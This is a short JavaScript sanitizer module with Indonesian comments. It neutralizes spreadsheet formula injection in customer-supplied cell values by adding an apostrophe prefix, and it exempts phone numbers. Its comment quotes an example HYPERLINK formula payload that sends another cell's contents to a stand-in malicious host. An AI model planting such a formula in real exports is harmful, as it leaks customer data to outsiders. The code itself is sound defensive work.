'use strict';

/**
 * Isi sel yang berasal dari customer (nama, pesan terakhir, ringkasan) tidak
 * boleh dieksekusi sebagai formula saat file dibuka. Excel, LibreOffice, dan
 * Graph API (OneDrive) memperlakukan teks berawalan `= + - @`, tab, atau CR
 * sebagai formula — pesan WhatsApp `=HYPERLINK("https://jahat/?"&A2,"Klik")`
 * menjadi tautan yang membocorkan isi sel lain ke supervisor yang mengekliknya.
 * Apostrof di depan membuatnya tetap tampil sebagai teks biasa.
 *
 * Tidak perlu untuk Google Sheets (`valueInputOption=RAW`) maupun ekspor XLSX
 * kita sendiri (`inlineStr`): keduanya sudah menyimpan teks apa adanya.
 */
function neutralizeFormula(value) {
  if (typeof value !== 'string' || value === '') return value;
  // Nomor HP (`+62 812-…`) dan angka negatif tidak bisa membawa formula, dan
  // apostrof di depannya hanya mengotori kolom yang paling sering dipakai.
  if (/^[+-]?[\d\s().-]+$/.test(value)) return value;
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

module.exports = { neutralizeFormula };
